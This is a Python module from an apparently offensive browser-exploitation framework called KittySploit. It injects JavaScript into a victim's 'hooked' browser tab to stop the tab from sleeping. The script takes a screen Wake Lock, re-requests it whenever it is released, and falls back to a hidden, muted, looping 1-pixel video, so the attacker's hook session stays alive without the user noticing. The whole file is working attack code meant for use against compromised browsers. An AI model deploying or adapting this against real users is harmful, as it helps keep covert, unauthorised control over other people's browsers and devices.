from kittysploit import *


class Module(BrowserAuxiliary):

	__info__ = {
		"name": "No Sleep",
		"description": "Prevent the hooked tab from sleeping (Wake Lock API + silent video fallback, BeEF nosleep)",
		"author": "KittySploit Team",
		"browser": Browser.ALL,
		"platform": Platform.ALL,
		"session_type": SessionType.BROWSER,
	}

	def run(self):
		code_js = """
		(function() {
			if (window.__ksNoSleep) {
				return 'NoSleep already active';
			}
			window.__ksNoSleep = { wakeLock: null, video: null };

			function startVideoFallback() {
				if (window.__ksNoSleep.video) return;
				try {
					const v = document.createElement('video');
					v.setAttribute('playsinline', '');
					v.setAttribute('muted', '');
					v.muted = true;
					v.loop = true;
					v.style.cssText = 'position:fixed;opacity:0;pointer-events:none;width:1px;height:1px;';
					v.src = 'data:video/webm;base64,GkXfo59ChoEBQveBAULygQRC84EIQoKEd2VibUKHgQRChYECGFOAZwEAAAAAAAHTEU2bdLpNu4tTq4QVSalmU6yBoU27i1OrhBZUmuKBoU2BTYQGAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABZAV0BAX/Y/+IX+a/WAKaWSW5hcm9yb3JkA2XvQAA=';
					document.body.appendChild(v);
					const p = v.play();
					if (p && typeof p.catch === 'function') {
						p.catch(function() {});
					}
					window.__ksNoSleep.video = v;
				} catch (e) {}
			}

			async function enableWakeLock() {
				if (!navigator.wakeLock) {
					startVideoFallback();
					return 'wakeLock unavailable; video fallback started';
				}
				try {
					window.__ksNoSleep.wakeLock = await navigator.wakeLock.request('screen');
					window.__ksNoSleep.wakeLock.addEventListener('release', function() {
						navigator.wakeLock.request('screen').then(function(wl) {
							window.__ksNoSleep.wakeLock = wl;
						}).catch(startVideoFallback);
					});
					document.addEventListener('visibilitychange', function() {
						if (document.visibilityState === 'visible' && !window.__ksNoSleep.wakeLock) {
							enableWakeLock();
						}
					});
					return 'Wake Lock active';
				} catch (e) {
					startVideoFallback();
					return 'Wake Lock denied; video fallback started: ' + (e.message || e);
				}
			}

			return enableWakeLock();
		})();
		"""
		result = self.send_js_and_wait_for_response(code_js, timeout=8.0)
		if result:
			print_success(str(result))
			print_info("Tab should stay awake; re-run after navigation if the hook reloads.")
			return True
		return self.send_js(code_js.replace("return enableWakeLock();", "enableWakeLock();"))
